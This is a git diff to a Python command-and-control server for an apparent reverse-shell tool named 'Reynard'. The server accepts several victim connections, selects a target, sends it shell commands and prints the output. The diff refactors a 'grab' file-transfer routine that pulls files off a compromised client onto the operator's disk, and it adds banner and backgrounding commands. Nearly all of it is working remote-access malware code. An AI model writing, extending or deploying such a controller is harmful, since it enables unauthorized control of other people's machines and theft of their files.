@@ -12,20 +12,6 @@ import socketserver
 
 #creds to thenewboston for multiple connection code.
 
-def transfer(conn, command):
-    conn.send(command.encode()) # send command to connection
-    f = open('/root/Desktop'+path,'wb')
-    while True:
-        bits = conn.recv(1024)
-        if bits.endswith("DONE".encode()):
-            f.write(bits[:-4]) # write out bits and remove DONE
-            f.close()
-            print("[+]Transfer Completed")
-            break
-        if "File not found".encode() in bits:
-            print("[-]Unable to find the file")
-            break
-        f.write(bits)
 
 THREAD_COUNT = 2
 JOB_NUMBER = [1, 2]
@@ -38,6 +24,7 @@ COMMANDS = {
     'select':['Selects a client by its index. Takes index as a parameter'],
     'quit':['Stops current connection with a client. To be used when client is selected'],
     'accept':['Begin accepting more connections'],
+    'banner':['Display Reynard banner'],
     'exit':['Shuts server down'],
 
 
@@ -49,7 +36,7 @@ class MyTCPServer(object):
 
     def __init__(self):
         #make sure this works later bud
-        header = """
+        self.header = """
 $$$$$$$\                                                          $$\ 
 $$  __$$\                                                         $$ |
 $$ |  $$ | $$$$$$\  $$\   $$\ $$$$$$$\   $$$$$$\   $$$$$$\   $$$$$$$ |
@@ -62,13 +49,29 @@ $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$$ |
                     \$$$$$$  |    
                     \n                                    
 """
-        print(header)
+        print(self.header)
         self.host = input("Host: ")
         self.port = int(input("Port: "))
 
         self.s = None
         self.connections = []
         self.addresses = []
+
+    def transfer(self, conn, command):
+        conn.send(command.encode()) # send command to connection
+        grab,path = command.split('*')
+        f = open('/mnt/d/'+path,'wb')
+        while True:
+            bits = conn.recv(1024)
+            if bits.endswith("DONE".encode()):
+               f.write(bits[:-4]) # write out bits and remove DONE
+               f.close()
+               print("[+]Transfer Completed")
+               break
+            if "File not found".encode() in bits:
+                print("[-]Unable to find the file")
+                break
+            f.write(bits)
 
     def print_menu(self):
         for cmd, v in COMMANDS.items():
@@ -158,6 +161,8 @@ $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$$ |
                 self.print_menu()
             elif command == 'accept':
                 self.accept_clients()
+            elif command == 'banner':
+                print(self.header)
             elif command == '':
                 pass
             else:
@@ -190,7 +195,7 @@ $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$$ |
         except IndexError:
             print("Not a Valid Target")
             return None, None
-        print("Connectionn now established with " + str(self.addresses[target][2]))
+        print("Connection now established with " + str(self.addresses[target][2]))
         return target,conn
 
     def read_command_output(self, conn):
@@ -223,13 +228,19 @@ $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$$ |
         while True:
             try:
                 cmd = input()
-                if len(str.encode(cmd)) > 0:
-                    if str(cmd) == "back":
-                        break
+                if "grab" in str(cmd):
+                    self.transfer(conn, cmd)
+                elif len(str.encode(cmd)) > 0:
+                    if str(cmd) == "background":
+                        print("Placing shell in background")
+                        return
                     conn.send(str.encode(cmd))
                     cmd_output = self.read_command_output(conn)
                     client_response = str(cmd_output, "utf-8")
                     print(client_response, end="")
+                else:
+                    print(cwd, end="")
+                    continue
                 if cmd == 'quit':
                     print("leaving")
                     break
